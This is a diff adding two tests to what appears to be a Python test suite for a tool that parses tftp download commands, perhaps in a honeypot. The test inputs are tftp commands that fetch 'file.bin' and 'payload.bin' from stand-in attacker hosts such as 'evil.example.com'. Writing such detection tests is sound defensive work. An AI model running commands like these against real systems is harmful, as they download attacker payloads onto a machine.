@@ -44,3 +44,17 @@ def test_tftp_bare_host_recognised():
     assert pull is not None
     assert pull["tool"] == "tftp"
     assert pull["url"] == "10.0.0.9"
+
+
+def test_tftp_host_leading_hostname():
+    # host-leading BSD/inetutils syntax: the host precedes the filename, and
+    # neither is an IP — exercises the _first_host fallback branch.
+    _, pull = respond("tftp -i evil.example.com GET file.bin")
+    assert pull is not None and pull["tool"] == "tftp"
+    assert pull["url"] == "evil.example.com"
+
+
+def test_tftp_host_trailing_hostname():
+    _, pull = respond("tftp -g -r payload.bin bad.example.net")
+    assert pull is not None
+    assert pull["url"] == "bad.example.net"
